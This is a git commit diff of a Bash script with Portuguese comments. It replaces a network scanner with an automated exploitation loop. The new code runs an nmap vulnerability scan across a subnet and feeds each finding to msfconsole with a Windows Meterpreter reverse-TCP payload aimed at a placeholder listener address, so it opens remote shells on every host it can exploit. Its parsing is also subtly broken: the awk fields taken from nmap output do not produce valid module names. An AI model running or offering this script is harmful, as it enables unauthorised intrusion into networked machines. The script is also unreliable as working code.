8f5acfb5f623324343fdeda8b84d10dea2eee958
hackealy <80939280+hackealy@users.noreply.github.com>
2023-04-27 11:41:50 -0300

    Update scanwin.sh

--- scanwin.sh
+++ scanwin.sh
@@ -1,29 +1,18 @@
 #!/bin/bash
 
-# Define o endereço IP do gateway padrão da rede
-GATEWAY_IP="192.168.1.1"
+# Define o endereço IP da rede a ser testada
+NETWORK="192.168.1.0/24"
 
-# Define o nome do arquivo de log para registrar as atividades do teste
-LOG_FILE="test_log.txt"
+# Varre a rede em busca de sistemas online e portas abertas, identificando possíveis vulnerabilidades
+nmap -T4 -sS -sV -O --script vuln $NETWORK -oN results.txt
 
-# Escaneia a rede para identificar todos os dispositivos ativos usando o nmap e o arp-scan
-nmap -sn $GATEWAY_IP/24 | grep "report for" | cut -d " " -f 5 | sed 's/(//' | sed 's/)//' > active_hosts.txt
-arp-scan -l | grep -v "Interface" | grep -v "Starting" | grep -v "packets" | cut -f 2 > active_hosts.txt
+# Analisa o arquivo de resultados do Nmap e identifica as vulnerabilidades encontradas
+grep "VULNERABLE" results.txt | awk '{print $2,$6}' > vuln_list.txt
 
-# Adiciona uma entrada de log com a data e hora atuais
-echo "$(date) - Varredura de rede concluída" >> $LOG_FILE
-
-# Loop que executa o teste de penetração em cada dispositivo identificado
-while read -r target_ip; do
-    echo "$(date) - Iniciando teste de penetração em $target_ip" >> $LOG_FILE
-    # Executa o Metasploit ou outras ferramentas de teste de penetração no dispositivo
-    msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $target_ip; run"
-    msfconsole -q -x "use auxiliary/scanner/http/robots_txt; set RHOSTS $target_ip; run"
-    msfconsole -q -x "use auxiliary/scanner/http/title; set RHOSTS $target_ip; run"
-    msfconsole -q -x "use auxiliary/scanner/http/webdav_scanner; set RHOSTS $target_ip; run"
-    msfconsole -q -x "use auxiliary/scanner/http/wp_admin_urls; set RHOSTS $target_ip; run"
-    echo "$(date) - Teste de penetração concluído em $target_ip" >> $LOG_FILE
-done < active_hosts.txt
-
-# Exibe uma mensagem indicando que o teste foi concluído
-echo "Teste de penetração em todos os dispositivos ativos na rede concluído. Veja o arquivo de log para mais detalhes."
+# Executa o Metasploit para explorar as vulnerabilidades encontradas em cada dispositivo
+while read line; do
+  ip=$(echo $line | awk '{print $1}')
+  vuln=$(echo $line | awk '{print $2}')
+  echo "Exploring vulnerability $vuln on device $ip"
+  msfconsole -q -x "use $vuln; set RHOSTS $ip; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <your-ip>; set LPORT <your-port>; run"
+done < vuln_list.txt
